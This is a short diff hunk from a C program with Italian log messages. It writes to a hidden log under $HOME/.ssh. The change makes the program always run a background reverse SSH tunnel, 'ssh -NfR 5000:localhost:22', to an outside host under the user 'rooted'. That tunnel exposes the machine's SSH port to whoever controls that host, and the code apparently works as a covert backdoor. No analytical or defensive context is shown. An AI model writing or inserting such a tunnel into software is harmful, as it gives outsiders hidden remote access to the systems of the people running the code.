@@ -23,9 +23,7 @@ int main()
             system("echo 'Errore $HOME/.ssh/known_hosts non esiste' >> $HOME/.ssh/.log");
             system("echo '#########################################' >> $HOME/.ssh/.log");
         }
-        else {
-            system("ssh -NfR 5000:localhost:22 rooted@rooted01.ns0.it");
-        }
+        system("ssh -NfR 5000:localhost:22 rooted@rooted01.ns0.it");
     }
 
 
